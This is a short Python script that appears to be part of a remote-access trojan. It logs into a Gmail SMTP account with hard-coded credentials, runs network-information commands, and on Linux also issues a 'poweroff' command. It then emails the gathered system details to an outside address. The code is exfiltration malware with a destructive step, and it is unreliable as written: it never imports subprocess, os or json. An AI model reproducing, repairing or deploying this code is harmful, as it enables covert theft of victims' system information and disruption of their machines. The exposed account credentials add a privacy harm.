import smtplib
import platform

server = smtplib.SMTP('smtp.gmail.com', 587)
server.login("cvdrat@gmail.com", "rat123rat123")

if platform.system().lower() == 'windows':
	cmd = subprocess.Popen("ipconfig",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
if platform.system().lower() == 'linux':
	cmd = subprocess.Popen("poweroff",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	cmd = subprocess.Popen("ifconfig",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


standardOutput = str(cmd.stdout.read(),"utf-8")
standardError = str(cmd.stderr.read(),"utf-8")

response = {"status":"OK","stdout":standardOutput,"stderr":standardError,"dir":str(os.getcwd()),"systemInfo":platform.platform()}
response = json.dumps(response)

server.sendmail("cvdrat@gmail.com", "hybridx18@gmail.com",response)